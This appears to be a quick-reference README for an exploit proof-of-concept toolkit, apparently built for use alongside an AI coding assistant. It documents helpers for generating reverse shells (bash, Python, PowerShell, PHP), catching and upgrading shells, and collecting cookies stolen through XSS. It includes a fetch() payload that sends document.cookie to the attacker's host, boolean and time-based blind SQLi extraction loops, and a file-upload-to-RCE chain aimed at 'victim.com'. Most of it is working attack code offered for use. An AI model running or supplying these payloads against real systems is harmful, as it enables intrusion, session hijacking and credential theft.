# POC Utils Quick Reference

Quick reference for all utilities included in this POC template. These are designed for **speed and simplicity** in security research.

## 🎨 Colored Output (`utils/output.py`)

Better visibility for your exploit output:

```python
from utils.output import out

out.success("Target vulnerable!")      # [+] Green
out.error("Connection failed")         # [-] Red
out.info("Starting exploit")           # [*] Blue
out.warning("Default creds")           # [!] Yellow
out.status("Extracting data...")       # [...] Cyan
out.debug("Response: 200 OK")          # [DEBUG] Magenta
```

## 🐚 Reverse Shells (`utils/reverse_shells.py`)

Generate reverse shells dynamically with proper LHOST/LPORT:

```python
from utils.reverse_shells import *

# Generate shell files (written to payloads/shells/)
path = bash_shell("10.10.14.5", 4444)           # Returns: "shells/rev_bash.sh"
path = python_shell("10.10.14.5", 4444)         # Returns: "shells/rev_python.py"
path = powershell_shell("10.10.14.5", 4444)     # Returns: "shells/rev_powershell.ps1"

# Get one-liners (no file written)
cmd = python_oneliner("10.10.14.5", 4444)       # For direct RCE
cmd = powershell_oneliner("10.10.14.5", 4444)   # For Windows

# Quick helpers with instructions
quick_bash(args.lhost, 4444)     # Prints curl/wget commands
quick_python(args.lhost, 4444)   # Prints download instructions
```

Serve shells at: `http://YOUR-IP:8000/shells/rev_bash.sh`

## 🎣 Shell Catcher (`utils/shell_catcher.py`)

Catch reverse shells directly in Python - no need for separate netcat!

```python
from utils.shell_catcher import ShellCatcher, auto_shell, quick_catch

# Method 1: Full control
catcher = ShellCatcher(4444)
catcher.start()                          # Start listener
trigger_exploit()                         # Your RCE
if catcher.wait_for_shell(timeout=30):   # Wait for connection
    catcher.stabilize()                   # Upgrade to PTY (automatic terminal sizing!)
    catcher.interact()                    # Full interactive shell with tab completion!

# Method 2: Context manager (recommended)
with auto_shell(4444) as catcher:
    trigger_exploit()
    if catcher.shell_caught:              # Auto-waits for shell
        catcher.stabilize()
        catcher.interact()                # Auto-uses raw mode after stabilize!

# Method 3: With trigger function
def trigger():
    requests.get(f"http://target/rce?cmd={python_oneliner(lhost, 4444)}")

quick_catch(4444, trigger_func=trigger)   # Does everything automatically
```

**Features:**
- Automatic PTY upgrade with Python/script
- Terminal size detection and setting
- Command history with arrow keys
- Tab completion (after stabilization)
- Raw TTY mode for full interactivity

## 🍪 Cookie Handling (`utils/cookie.py`)

Parse stolen cookies for reuse:

```python
from utils.cookie import parse_cookie_string
from utils.server_hooks import get_cookie

# Wait for XSS to steal cookie
cookie_str = get_cookie(timeout=30)
# Returns: "session=abc123; token=xyz789"

# Parse for requests
cookies = parse_cookie_string(cookie_str)
# Returns: {'session': 'abc123', 'token': 'xyz789'}

# Use in requests
response = requests.get(target_url, cookies=cookies)
```

## 🌐 Server Hooks (`utils/server_hooks.py`)

Get data from your callback server's queue:

```python
from utils.server_hooks import get_cookie, wait_for_callback, get_event

# Wait for cookie from XSS
cookie = get_cookie(server='http://localhost:8000', timeout=30)

# Wait for any callback type
data = wait_for_callback(timeout=30, param='cookie')

# Get raw events
event = get_event()  # {'type': 'cookie', 'data': '...', 'timestamp': '...'}

# Clear queue before new attempt
drain_queue()
```

## 📁 Paths (`utils/paths.py`)

Consistent access to project directories:

```python
from utils.paths import LOGS_DIR, PAYLOADS_DIR, get_log_file, ensure_dirs_exist

# Get absolute paths
logs = LOGS_DIR           # /path/to/project/logs
payloads = PAYLOADS_DIR   # /path/to/project/payloads

# Ensure all dirs exist
ensure_dirs_exist()

# Get specific log file
server_log = get_log_file('server.ndjson')
```

## 🔐 Encoding (`utils/encoding.py`)

Common encoding/decoding operations:

```python
from utils.encoding import b64_encode, b64_decode, url_encode, url_decode
from utils.encoding import to_hex, from_hex, html_encode, html_decode

# Base64
encoded = b64_encode("admin:password")
decoded = b64_decode("YWRtaW46cGFzc3dvcmQ=")

# URL encoding
safe = url_encode("../../etc/passwd")
unsafe = url_decode("%2e%2e%2f%2e%2e%2fetc%2fpasswd")

# Hex
hex_str = to_hex("ABCD")           # "41424344"
text = from_hex("41424344")        # "ABCD"

# HTML entities
safe_html = html_encode("<script>")
unsafe = html_decode("&lt;script&gt;")
```

## 🌍 Network (`utils/network.py`)

Network utilities for callbacks:

```python
from utils.network import get_interfaces, get_callback_host

# Get all network interfaces
interfaces = get_interfaces()
# {'eth0': '10.10.14.5', 'tun0': '10.10.16.2', ...}

# Get best callback IP (prioritizes VPN interfaces)
lhost = get_callback_host()
# Returns: '10.10.16.2' (or best available)
```

## ⏱️ Timing (`utils/timing.py`)

Timing utilities for blind exploitation:

```python
from utils.timing import time_request

# Time a request (useful for blind SQLi)
def attempt(payload):
    return requests.get(f"http://target?id={payload}")

duration = time_request(attempt, "1' AND SLEEP(5)--")
if duration > 5:
    out.success("Vulnerable to time-based SQLi!")
```

## 🚀 Common POC Patterns

### XSS Cookie Stealer
```python
# 1. Start server to catch callbacks
# python servers/server.py

# 2. Send XSS payload
xss = f"<script>fetch('http://{lhost}:8000/queue?cookie='+document.cookie)</script>"
send_payload(xss)

# 3. Get stolen cookie
from utils.server_hooks import get_cookie
from utils.cookie import parse_cookie_string

cookie_str = get_cookie(timeout=30)
cookies = parse_cookie_string(cookie_str)

# 4. Use stolen session
r = requests.get(target, cookies=cookies)
```

### RCE to Shell
```python
from utils.reverse_shells import python_oneliner
from utils.shell_catcher import auto_shell

# Generate payload
cmd = python_oneliner(lhost, 4444)

with auto_shell(4444) as catcher:
    # Trigger RCE
    requests.post(target, data={'cmd': cmd})

    # Get shell
    if catcher.shell_caught:
        catcher.stabilize()  # Upgrade to PTY
        catcher.interact()   # Full interactive shell!
```

### Blind SQLi Boolean-Based
```python
from utils.output import out
import string

def check(payload):
    r = requests.get(f"http://target?id=1' AND {payload}--")
    return "Welcome" in r.text

# Extract data
password = ""
for pos in range(1, 33):
    for char in string.ascii_letters + string.digits:
        if check(f"SUBSTRING(password,{pos},1)='{char}'"):
            password += char
            out.success(f"Password: {password}")
            break
```

### File Upload to RCE
```python
from utils.reverse_shells import php_shell
from utils.shell_catcher import quick_catch

# Generate PHP shell
shell_path = php_shell(lhost, 4444)

# Upload shell
files = {'upload': open(f'payloads/{shell_path}', 'rb')}
r = requests.post(f"{target}/upload", files=files)

# Trigger and catch
def trigger():
    requests.get(f"{target}/uploads/shell.php")

quick_catch(4444, trigger_func=trigger)
```

## 💡 Tips

1. **Always use colored output** - Makes exploits much easier to debug
2. **Use shell_catcher** instead of netcat - Get PTY upgrade automatically
3. **Generate shells on-demand** - Don't hardcode LHOST/LPORT
4. **Check CLAUDE.md** for more examples and patterns
5. **Keep it simple** - These utils prioritize speed over perfection

## 🏃 Quick Start Checklist

```bash
# 1. Start your server (in separate terminal)
python servers/server.py

# 2. Run your exploit
python exploit.py --target http://victim.com --lhost YOUR-IP

# 3. Common imports for any POC
from utils.output import out
from utils.shell_catcher import auto_shell
from utils.reverse_shells import python_oneliner
from utils.server_hooks import get_cookie
from utils.cookie import parse_cookie_string
```

Remember: This is for **quick and dirty POCs**. Make it work, make it fast, keep it simple!